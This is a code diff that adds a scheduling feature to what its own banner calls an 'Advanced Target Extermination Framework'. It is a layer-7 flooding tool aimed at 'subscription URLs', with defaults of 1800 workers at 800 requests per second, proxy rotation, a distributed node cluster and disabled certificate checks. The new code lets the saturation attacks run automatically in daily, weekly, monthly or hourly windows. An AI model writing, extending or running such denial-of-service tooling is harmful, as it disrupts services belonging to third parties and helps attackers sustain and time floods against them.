@@ -11,7 +11,8 @@ import json
 import base64
 import signal
 import ssl as ssl_lib
-from datetime import datetime
+import calendar
+from datetime import datetime, timedelta, time as dtime
 import getpass
 
 try:
@@ -45,9 +46,14 @@ PROXY_SSL_CTX.check_hostname = False
 PROXY_SSL_CTX.verify_mode = ssl_lib.CERT_NONE
 
 NODES_FILE = "nodes.json"
+SCHEDULE_FILE = "schedule.json"
 DEFAULT_RPS = 800
 DEFAULT_WORKERS = 1800
 DEFAULT_DURATION_MIN = 30
+
+WEEKDAYS_SHORT = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
+WEEKDAYS_FULL = ["Monday", "Tuesday", "Wednesday", "Thursday",
+                 "Friday", "Saturday", "Sunday"]
 
 _INTERRUPTED = [False]
 
@@ -83,6 +89,266 @@ async def interruptible_sleep(seconds):
             return
         remaining = end - time.monotonic()
         await asyncio.sleep(min(0.5, max(0.05, remaining)))
+
+
+# =====================================================================
+#  SCHEDULE ENGINE
+# =====================================================================
+
+class ScheduleSlot:
+    TYPE = "base"
+
+    def to_dict(self):
+        return {"type": self.TYPE, **self._data()}
+
+    def _data(self):
+        return {}
+
+    def current_or_next_window(self, now):
+        return None
+
+    def describe(self):
+        return "?"
+
+    @staticmethod
+    def from_dict(d):
+        t = d.get("type")
+        try:
+            if t == "absolute":
+                return AbsoluteSlot(d["start"], d["end"])
+            if t == "daily":
+                return DailySlot(d["start_time"], d["end_time"],
+                                 d.get("days"), d.get("skip_days") or [])
+            if t == "monthly":
+                return MonthlySlot(d["day_of_month"],
+                                   d["start_time"], d["end_time"])
+            if t == "hourly":
+                return HourlySlot(d["start_minute"], d["duration_min"])
+        except Exception:
+            return None
+        return None
+
+
+class AbsoluteSlot(ScheduleSlot):
+    TYPE = "absolute"
+
+    def __init__(self, start, end):
+        self.start = start
+        self.end = end
+
+    def _data(self):
+        return {"start": self.start, "end": self.end}
+
+    def _parse(self):
+        s = datetime.strptime(self.start, "%Y-%m-%d %H:%M")
+        e = datetime.strptime(self.end, "%Y-%m-%d %H:%M")
+        return s, e
+
+    def current_or_next_window(self, now):
+        try:
+            s, e = self._parse()
+        except Exception:
+            return None
+        if e <= now:
+            return None
+        return (s, e)
+
+    def describe(self):
+        return f"Absolute · {self.start}  →  {self.end}"
+
+
+class DailySlot(ScheduleSlot):
+    TYPE = "daily"
+
+    def __init__(self, start_time, end_time, days=None, skip_days=None):
+        self.start_time = start_time
+        self.end_time = end_time
+        self.days = days
+        self.skip_days = skip_days or []
+
+    def _data(self):
+        return {
+            "start_time": self.start_time,
+            "end_time": self.end_time,
+            "days": self.days,
+            "skip_days": self.skip_days,
+        }
+
+    def _t(self, base_date, time_str):
+        h, m = map(int, time_str.split(":"))
+        return datetime.combine(base_date, dtime(h, m))
+
+    def _day_allowed(self, weekday):
+        if weekday in self.skip_days:
+            return False
+        if self.days is None:
+            return True
+        return weekday in self.days
+
+    def current_or_next_window(self, now):
+        for offset in range(0, 10):
+            day = (now + timedelta(days=offset)).date()
+            wd = day.weekday()
+            if not self._day_allowed(wd):
+                continue
+            try:
+                s = self._t(day, self.start_time)
+                e = self._t(day, self.end_time)
+            except Exception:
+                continue
+            if e <= s:
+                e += timedelta(days=1)
+            if e <= now:
+                continue
+            return (s, e)
+        return None
+
+    def describe(self):
+        if self.days is None:
+            days_txt = "every day"
+        else:
+            days_txt = ", ".join(WEEKDAYS_SHORT[d] for d in sorted(self.days))
+        skip_txt = ""
+        if self.skip_days:
+            skip_txt = "  (skip " + ", ".join(
+                WEEKDAYS_SHORT[d] for d in sorted(self.skip_days)) + ")"
+        return (f"Daily · {self.start_time} → {self.end_time} "
+                f"on {days_txt}{skip_txt}")
+
+
+class MonthlySlot(ScheduleSlot):
+    TYPE = "monthly"
+
+    def __init__(self, day_of_month, start_time, end_time):
+        self.day_of_month = day_of_month
+        self.start_time = start_time
+        self.end_time = end_time
+
+    def _data(self):
+        return {
+            "day_of_month": self.day_of_month,
+            "start_time": self.start_time,
+            "end_time": self.end_time,
+        }
+
+    def current_or_next_window(self, now):
+        for month_offset in range(0, 14):
+            y = now.year
+            m = now.month + month_offset
+            while m > 12:
+                m -= 12
+                y += 1
+            max_day = calendar.monthrange(y, m)[1]
+            d = min(self.day_of_month, max_day)
+            try:
+                h1, m1 = map(int, self.start_time.split(":"))
+                h2, m2 = map(int, self.end_time.split(":"))
+                s = datetime(y, m, d, h1, m1)
+                e = datetime(y, m, d, h2, m2)
+            except Exception:
+                continue
+            if e <= s:
+                e += timedelta(days=1)
+            if e <= now:
+                continue
+            return (s, e)
+        return None
+
+    def describe(self):
+        return (f"Monthly · day {self.day_of_month}  "
+                f"{self.start_time} → {self.end_time}")
+
+
+class HourlySlot(ScheduleSlot):
+    TYPE = "hourly"
+
+    def __init__(self, start_minute, duration_min):
+        self.start_minute = start_minute
+        self.duration_min = duration_min
+
+    def _data(self):
+        return {
+            "start_minute": self.start_minute,
+            "duration_min": self.duration_min,
+        }
+
+    def current_or_next_window(self, now):
+        for offset in range(0, 26):
+            base = (now + timedelta(hours=offset)).replace(
+                minute=self.start_minute, second=0, microsecond=0
+            )
+            e = base + timedelta(minutes=self.duration_min)
+            if e <= now:
+                continue
+            return (base, e)
+        return None
+
+    def describe(self):
+        return (f"Hourly · at :{self.start_minute:02d}, "
+                f"runs {self.duration_min} min")
+
+
+class ScheduleManager:
+    def __init__(self):
+        self.slots = []
+        self.load()
+
+    def is_empty(self):
+        return not self.slots
+
+    def clear(self):
+        self.slots = []
+        self.save()
+
+    def add(self, slot):
+        self.slots.append(slot)
+        self.save()
+
+    def load(self):
+        if not os.path.exists(SCHEDULE_FILE):
+            return
+        try:
+            with open(SCHEDULE_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            for d in data.get("slots", []):
+                s = ScheduleSlot.from_dict(d)
+                if s is not None:
+                    self.slots.append(s)
+        except Exception:
+            self.slots = []
+
+    def save(self):
+        try:
+            with open(SCHEDULE_FILE, "w", encoding="utf-8") as f:
+                json.dump(
+                    {"slots": [s.to_dict() for s in self.slots]},
+                    f, indent=2, ensure_ascii=False
+                )
+        except Exception:
+            pass
+
+    def describe(self):
+        return [s.describe() for s in self.slots]
+
+    def next_window(self, now=None):
+        now = now or datetime.now()
+        candidates = []
+        for slot in self.slots:
+            try:
+                w = slot.current_or_next_window(now)
+            except Exception:
+                w = None
+            if w is not None:
+                candidates.append(w)
+        if not candidates:
+            return None
+        active = [w for w in candidates if w[0] <= now < w[1]]
+        if active:
+            return max(active, key=lambda w: w[1])
+        return min(candidates, key=lambda w: w[0])
+
+
+SCHEDULE = ScheduleManager()
 
 
 NODE_SCRIPT = r'''#!/usr/bin/env python3
@@ -650,6 +916,8 @@ def clear_screen():
 
 def print_banner():
     clear_screen()
+    now = datetime.now()
+    ts = now.strftime("%A, %Y-%m-%d  %H:%M:%S")
     banner = f"""
 {Colors.RED}{Colors.BOLD}
   ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗   ██╗████████╗
@@ -660,6 +928,7 @@ def print_banner():
   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   
 {Colors.RESET}{Colors.BOLD}{Colors.MAGENTA}                  [ PANEL/SUB URL ATTACK ]
 {Colors.DIM}                  Advanced Target Extermination Framework{Colors.RESET}
+{Colors.YELLOW}                  ● Now: {ts}{Colors.RESET}
 """
     print(banner)
 
@@ -2675,6 +2944,262 @@ async def proxy_management_menu():
             input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
 
 
+async def schedule_management_menu():
+    def _parse_hhmm(s):
+        s = (s or "").strip()
+        parts = s.split(":")
+        if len(parts) != 2:
+            raise ValueError("HH:MM")
+        h = int(parts[0]); m = int(parts[1])
+        if not (0 <= h < 24 and 0 <= m < 60):
+            raise ValueError("range")
+        return f"{h:02d}:{m:02d}"
+
+    def _parse_days(s):
+        if not (s or "").strip():
+            return []
+        out = []
+        for x in s.split(","):
+            x = x.strip()
+            if not x:
+                continue
+            d = int(x)
+            if not (0 <= d <= 6):
+                raise ValueError("day range")
+            out.append(d)
+        return out
+
+    def _ask_add_more():
+        while True:
+            a = input(f"  {Colors.BOLD}➜ Add another slot? [{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
+            if a in ("", "y", "yes"):
+                return True
+            if a in ("n", "no"):
+                return False
+
+    def _add_absolute():
+        while True:
+            clear_screen()
+            print_banner()
+            print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD ABSOLUTE SLOT{Colors.RESET}")
+            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
+            print(f"  {Colors.DIM}Format: YYYY-MM-DD  (e.g. 2025-01-15)  ·  HH:MM (e.g. 14:00){Colors.RESET}\n")
+            try:
+                sd = input(f"  {Colors.BOLD}➜ Start date: {Colors.RESET}").strip()
+                datetime.strptime(sd, "%Y-%m-%d")
+                st = _parse_hhmm(input(f"  {Colors.BOLD}➜ Start time: {Colors.RESET}").strip())
+                ed = input(f"  {Colors.BOLD}➜ End date:   {Colors.RESET}").strip()
+                datetime.strptime(ed, "%Y-%m-%d")
+                et = _parse_hhmm(input(f"  {Colors.BOLD}➜ End time:   {Colors.RESET}").strip())
+            except Exception:
+                print(f"\n  {Colors.RED}⚠ Invalid input. Try again.{Colors.RESET}")
+                time.sleep(1.2)
+                continue
+
+            start = f"{sd} {st}"
+            end = f"{ed} {et}"
+            try:
+                s_dt = datetime.strptime(start, "%Y-%m-%d %H:%M")
+                e_dt = datetime.strptime(end, "%Y-%m-%d %H:%M")
+            except Exception:
+                print(f"\n  {Colors.RED}⚠ Invalid datetime.{Colors.RESET}")
+                time.sleep(1.2)
+                continue
+            if e_dt <= s_dt:
+                print(f"\n  {Colors.RED}⚠ End must be after start.{Colors.RESET}")
+                time.sleep(1.2)
+                continue
+
+            SCHEDULE.add(AbsoluteSlot(start, end))
+            print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {start} → {end}")
+            if not _ask_add_more():
+                return
+
+    def _add_daily():
+        while True:
+            clear_screen()
+            print_banner()
+            print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD DAILY RECURRING SLOT{Colors.RESET}")
+            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
+            try:
+                st = _parse_hhmm(input(f"  {Colors.BOLD}➜ Start time (HH:MM): {Colors.RESET}").strip())
+                et = _parse_hhmm(input(f"  {Colors.BOLD}➜ End time   (HH:MM): {Colors.RESET}").strip())
+            except Exception:
+                print(f"\n  {Colors.RED}⚠ Invalid time. Use HH:MM (e.g. 07:30).{Colors.RESET}")
+                time.sleep(1.2)
+                continue
+
+            print()
+            print(f"  {Colors.DIM}Day indices: 0=Mon  1=Tue  2=Wed  3=Thu  4=Fri  5=Sat  6=Sun{Colors.RESET}")
+            all_days = input(f"  {Colors.BOLD}➜ Include ALL days? [{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
+            days = None
+            if all_days in ("n", "no"):
+                try:
+                    raw = input(f"  {Colors.BOLD}➜ Which days to include (e.g. 0,1,2): {Colors.RESET}").strip()
+                    days = _parse_days(raw)
+                    if not days:
+                        raise ValueError("empty")
+                except Exception:
+                    print(f"\n  {Colors.RED}⚠ Invalid days list.{Colors.RESET}")
+                    time.sleep(1.2)
+                    continue
+
+            skip_days = []
+            skip_ans = input(f"  {Colors.BOLD}➜ Skip any specific days? [y/{Colors.GREEN}N{Colors.RESET}]: ").strip().lower()
+            if skip_ans in ("y", "yes"):
+                try:
+                    skip_days = _parse_days(
+                        input(f"  {Colors.BOLD}➜ Days to skip (e.g. 3,4): {Colors.RESET}").strip()
+                    )
+                except Exception:
+                    print(f"\n  {Colors.RED}⚠ Invalid skip list.{Colors.RESET}")
+                    time.sleep(1.2)
+                    continue
+
+            slot = DailySlot(st, et, days, skip_days)
+            SCHEDULE.add(slot)
+            print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {slot.describe()}")
+            if not _ask_add_more():
+                return
+
+    def _add_weekly():
+        while True:
+            clear_screen()
+            print_banner()
+            print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD WEEKLY SLOT{Colors.RESET}")
+            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
+            print(f"  {Colors.DIM}Day indices: 0=Mon  1=Tue  2=Wed  3=Thu  4=Fri  5=Sat  6=Sun{Colors.RESET}\n")
+            try:
+                raw = input(f"  {Colors.BOLD}➜ Weekday(s) (e.g. 0 or 0,2,4): {Colors.RESET}").strip()
+                days = _parse_days(raw)
+                if not days:
+                    raise ValueError("empty")
+                st = _parse_hhmm(input(f"  {Colors.BOLD}➜ Start time (HH:MM): {Colors.RESET}").strip())
+                et = _parse_hhmm(input(f"  {Colors.BOLD}➜ End time   (HH:MM): {Colors.RESET}").strip())
+            except Exception:
+                print(f"\n  {Colors.RED}⚠ Invalid input.{Colors.RESET}")
+                time.sleep(1.2)
+                continue
+
+            slot = DailySlot(st, et, days, [])
+            SCHEDULE.add(slot)
+            print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {slot.describe()}")
+            if not _ask_add_more():
+                return
+
+    def _add_monthly():
+        while True:
+            clear_screen()
+            print_banner()
+            print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD MONTHLY SLOT{Colors.RESET}")
+            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
+            try:
+                d = int(input(f"  {Colors.BOLD}➜ Day of month (1-31): {Colors.RESET}").strip())
+                if not (1 <= d <= 31):
+                    raise ValueError("range")
+                st = _parse_hhmm(input(f"  {Colors.BOLD}➜ Start time (HH:MM): {Colors.RESET}").strip())
+                et = _parse_hhmm(input(f"  {Colors.BOLD}➜ End time   (HH:MM): {Colors.RESET}").strip())
+            except Exception:
+                print(f"\n  {Colors.RED}⚠ Invalid input.{Colors.RESET}")
+                time.sleep(1.2)
+                continue
+
+            slot = MonthlySlot(d, st, et)
+            SCHEDULE.add(slot)
+            print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {slot.describe()}")
+            if not _ask_add_more():
+                return
+
+    def _add_hourly():
+        while True:
+            clear_screen()
+            print_banner()
+            print(f"  {Colors.BOLD}{Colors.MAGENTA}● ADD HOURLY SLOT{Colors.RESET}")
+            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}\n")
+            print(f"  {Colors.DIM}Example: start at :00 for 15 min → runs 10:00-10:15, 11:00-11:15, ...{Colors.RESET}\n")
+            try:
+                m = int(input(f"  {Colors.BOLD}➜ Start at minute (0-59): {Colors.RESET}").strip())
+                if not (0 <= m <= 59):
+                    raise ValueError("range")
+                dm = int(input(f"  {Colors.BOLD}➜ Duration (minutes, 1-59): {Colors.RESET}").strip())
+                if not (1 <= dm <= 59):
+                    raise ValueError("range")
+            except Exception:
+                print(f"\n  {Colors.RED}⚠ Invalid input.{Colors.RESET}")
+                time.sleep(1.2)
+                continue
+
+            slot = HourlySlot(m, dm)
+            SCHEDULE.add(slot)
+            print(f"\n  {Colors.GREEN}✓{Colors.RESET} Added: {slot.describe()}")
+            if not _ask_add_more():
+                return
+
+    while True:
+        clear_screen()
+        print_banner()
+        print(f"  {Colors.BOLD}{Colors.MAGENTA}● ATTACK SCHEDULE MANAGER{Colors.RESET}")
+        print(f"  {Colors.DIM}{'─' * 76}{Colors.RESET}\n")
+
+        if SCHEDULE.is_empty():
+            print(f"  {Colors.DIM}  (no slots configured yet){Colors.RESET}\n")
+        else:
+            print(f"  {Colors.BOLD}● CONFIGURED SLOTS ({len(SCHEDULE.slots)}){Colors.RESET}\n")
+            for i, desc in enumerate(SCHEDULE.describe(), 1):
+                print(f"  {Colors.CYAN}{i:>2}.{Colors.RESET} {desc}")
+            nxt = SCHEDULE.next_window()
+            if nxt:
+                s, e = nxt
+                now = datetime.now()
+                if s <= now < e:
+                    print(f"\n  {Colors.GREEN}▶ Currently active: "
+                          f"{s.strftime('%Y-%m-%d %H:%M')} → {e.strftime('%Y-%m-%d %H:%M')}{Colors.RESET}")
+                else:
+                    delta = (s - now).total_seconds()
+                    print(f"\n  {Colors.YELLOW}▶ Next window: "
+                          f"{s.strftime('%Y-%m-%d %H:%M')} → {e.strftime('%Y-%m-%d %H:%M')}"
+                          f"  (in {int(delta // 3600):02d}:{int((delta % 3600) // 60):02d}:{int(delta % 60):02d}){Colors.RESET}")
+            else:
+                print(f"\n  {Colors.RED}▶ No future windows (all slots expired){Colors.RESET}")
+            print()
+
+        print(f"  {Colors.BOLD}● ADD SLOT{Colors.RESET}")
+        print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Absolute  — specific date + time range (one-shot)")
+        print(f"  {Colors.CYAN}  [2]{Colors.RESET}  Daily     — every day HH:MM → HH:MM (with day filter)")
+        print(f"  {Colors.CYAN}  [3]{Colors.RESET}  Weekly    — specific weekday(s)")
+        print(f"  {Colors.CYAN}  [4]{Colors.RESET}  Monthly   — day N of every month")
+        print(f"  {Colors.CYAN}  [5]{Colors.RESET}  Hourly    — every hour at minute M for D minutes")
+        print()
+        print(f"  {Colors.BOLD}● MAINTENANCE{Colors.RESET}")
+        print(f"  {Colors.RED}  [C]{Colors.RESET}  Clear all slots")
+        print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
+        print()
+        print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
+
+        choice = input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()
+
+        if choice == "0":
+            return
+        elif choice == "1":
+            _add_absolute()
+        elif choice == "2":
+            _add_daily()
+        elif choice == "3":
+            _add_weekly()
+        elif choice == "4":
+            _add_monthly()
+        elif choice == "5":
+            _add_hourly()
+        elif choice == "c":
+            if SCHEDULE.is_empty():
+                continue
+            confirm = input(f"\n  {Colors.RED}Clear ALL schedule slots? (y/N): {Colors.RESET}").strip().lower()
+            if confirm == "y":
+                SCHEDULE.clear()
+                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Schedule cleared")
+                time.sleep(0.8)
+
+
 async def node_management_menu():
     while True:
         clear_screen()
@@ -2849,7 +3374,7 @@ async def node_management_menu():
             print(f"  {Colors.DIM}└─{Colors.RESET} Failed "
                   f"{Colors.RED}{fail_count}{Colors.RESET}")
             input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            
+
         elif choice == "5":
             if not NODE_MANAGER.nodes:
                 print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
@@ -3136,6 +3661,66 @@ async def run_distributed_attack(target_url, concurrency, duration,
     save_json_report("distributed", combined)
 
 
+async def run_scheduled_attack(target_url, concurrency, use_proxy,
+                               safe_mode, nodes, rps):
+    """Run attack windows according to SCHEDULE."""
+    print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● SCHEDULED ATTACK MODE{Colors.RESET}")
+    print(f"  {Colors.DIM}The attack will only run during scheduled windows.{Colors.RESET}\n")
+
+    while True:
+        if _INTERRUPTED[0]:
+            return
+        now = datetime.now()
+        window = SCHEDULE.next_window(now)
+        if window is None:
+            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} No future scheduled windows. Exiting scheduler.")
+            return
+
+        s, e = window
+        if s > now:
+            wait = (s - now).total_seconds()
+            print(f"  {Colors.CYAN}➜ Next window: "
+                  f"{s.strftime('%Y-%m-%d %H:%M')} → {e.strftime('%Y-%m-%d %H:%M')}{Colors.RESET}")
+            print(f"  {Colors.DIM}Waiting {int(wait // 3600):02d}:"
+                  f"{int((wait % 3600) // 60):02d}:{int(wait % 60):02d}...{Colors.RESET}")
+            await interruptible_sleep(wait)
+            if _INTERRUPTED[0]:
+                return
+            now = datetime.now()
+            window = SCHEDULE.next_window(now)
+            if window is None:
+                continue
+            s, e = window
+
+        duration = (e - datetime.now()).total_seconds()
+        if duration <= 1:
+            await asyncio.sleep(1)
+            continue
+
+        print(f"\n  {Colors.GREEN}➜ Window active: "
+              f"{s.strftime('%H:%M')} → {e.strftime('%H:%M')} "
+              f"({int(duration)}s / {duration / 60:.1f} min){Colors.RESET}\n")
+        time.sleep(1)
+
+        try:
+            if nodes:
+                await run_distributed_attack(target_url, concurrency, duration,
+                                              use_proxy, safe_mode, nodes, rps=rps)
+            else:
+                await run_benchmark(target_url, concurrency, duration,
+                                    use_proxy, safe_mode=safe_mode, rps=rps)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            return
+        except Exception as ex:
+            print(f"\n  {Colors.RED}⚠ Window error: {ex}{Colors.RESET}")
+            time.sleep(3)
+            continue
+
+        if _INTERRUPTED[0]:
+            return
+        await asyncio.sleep(2)
+
+
 def get_target_url():
     while True:
         url = input(f"  {Colors.BOLD}➜ Target Subscription URL: {Colors.RESET}").strip()
@@ -3187,6 +3772,7 @@ def main_menu():
         print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Saturation Bombardment          {Colors.DIM}→ L7 high-concurrency{Colors.RESET}")
         print(f"  {Colors.YELLOW}  [2]{Colors.RESET}  Proxy Management                {Colors.DIM}→ rotation control{Colors.RESET}")
         print(f"  {Colors.MAGENTA}  [3]{Colors.RESET}  Node Management                 {Colors.DIM}→ distributed cluster{Colors.RESET}")
+        print(f"  {Colors.GREEN}  [4]{Colors.RESET}  Schedule Management             {Colors.DIM}→ attack time windows{Colors.RESET}")
         print(f"  {Colors.RED}  [0]{Colors.RESET}  Exit")
         print()
 
@@ -3203,6 +3789,12 @@ def main_menu():
                   f"{Colors.DIM}|{Colors.RESET}  total: {Colors.MAGENTA}{len(NODE_MANAGER.nodes)}{Colors.RESET}")
         else:
             print(f"  {Colors.DIM}●{Colors.RESET} Node cluster  {Colors.DIM}empty — single-server mode{Colors.RESET}")
+
+        if SCHEDULE.is_empty():
+            print(f"  {Colors.DIM}●{Colors.RESET} Schedule     {Colors.DIM}empty — no time windows{Colors.RESET}")
+        else:
+            print(f"  {Colors.DIM}●{Colors.RESET} Schedule     "
+                  f"{Colors.GREEN}{len(SCHEDULE.slots)} slot(s) configured{Colors.RESET}")
         print()
         print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
 
@@ -3228,6 +3820,13 @@ def main_menu():
                 _restore_terminal()
                 continue
             continue
+        elif choice == "4":
+            try:
+                asyncio.run(schedule_management_menu())
+            except KeyboardInterrupt:
+                _restore_terminal()
+                continue
+            continue
         elif choice != "1":
             print(f"  {Colors.RED}⚠ Invalid choice{Colors.RESET}")
             time.sleep(1)
@@ -3242,16 +3841,45 @@ def main_menu():
             rps = get_int_input(
                 f"  {Colors.BOLD}➜ Per-Worker RPS (0=unlimited) [{Colors.GREEN}{DEFAULT_RPS}{Colors.RESET}]: ",
                 DEFAULT_RPS, allow_zero=True, max_val=100000)
-            duration_min = get_int_input(
-                f"  {Colors.BOLD}➜ Attack Duration (minutes, 0=unlimited) [{Colors.GREEN}{DEFAULT_DURATION_MIN}{Colors.RESET}]: ",
-                DEFAULT_DURATION_MIN, allow_zero=True, max_val=60 * 24 * 365)
 
-            if duration_min == 0:
-                duration = 86400 * 365
-                duration_disp = "unlimited"
+            use_schedule = False
+            duration = None
+            duration_disp = ""
+
+            if not SCHEDULE.is_empty():
+                print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● SCHEDULE DETECTED{Colors.RESET}")
+                print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
+                for i, desc in enumerate(SCHEDULE.describe(), 1):
+                    print(f"  {Colors.CYAN}{i:>2}.{Colors.RESET} {desc}")
+                nxt = SCHEDULE.next_window()
+                if nxt:
+                    s, e = nxt
+                    now = datetime.now()
+                    if s <= now < e:
+                        print(f"\n  {Colors.GREEN}▶ Active NOW until "
+                              f"{e.strftime('%Y-%m-%d %H:%M')}{Colors.RESET}")
+                    else:
+                        print(f"\n  {Colors.YELLOW}▶ Next window: "
+                              f"{s.strftime('%Y-%m-%d %H:%M')} → "
+                              f"{e.strftime('%Y-%m-%d %H:%M')}{Colors.RESET}")
+                print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
+                ans = input(f"\n  {Colors.BOLD}➜ Use this schedule? "
+                            f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
+                use_schedule = (ans != "n")
+
+            if use_schedule:
+                duration = 0
+                duration_disp = "scheduled windows"
             else:
-                duration = duration_min * 60
-                duration_disp = f"{duration_min} min"
+                duration_min = get_int_input(
+                    f"  {Colors.BOLD}➜ Attack Duration (minutes, 0=unlimited) [{Colors.GREEN}{DEFAULT_DURATION_MIN}{Colors.RESET}]: ",
+                    DEFAULT_DURATION_MIN, allow_zero=True, max_val=60 * 24 * 365)
+                if duration_min == 0:
+                    duration = 86400 * 365
+                    duration_disp = "unlimited"
+                else:
+                    duration = duration_min * 60
+                    duration_disp = f"{duration_min} min"
 
             ans_safe = input(f"  {Colors.BOLD}➜ Enable Safe Mode? "
                              f"{Colors.DIM}(pause on origin errors, auto-resume){Colors.RESET} "
@@ -3286,7 +3914,11 @@ def main_menu():
             continue
 
         try:
-            if use_nodes:
+            if use_schedule:
+                asyncio.run(run_scheduled_attack(
+                    target_url, concurrency, use_proxy, safe_mode,
+                    ready_nodes if use_nodes else None, rps=rps))
+            elif use_nodes:
                 asyncio.run(run_distributed_attack(
                     target_url, concurrency, duration,
                     use_proxy, safe_mode, ready_nodes, rps=rps))
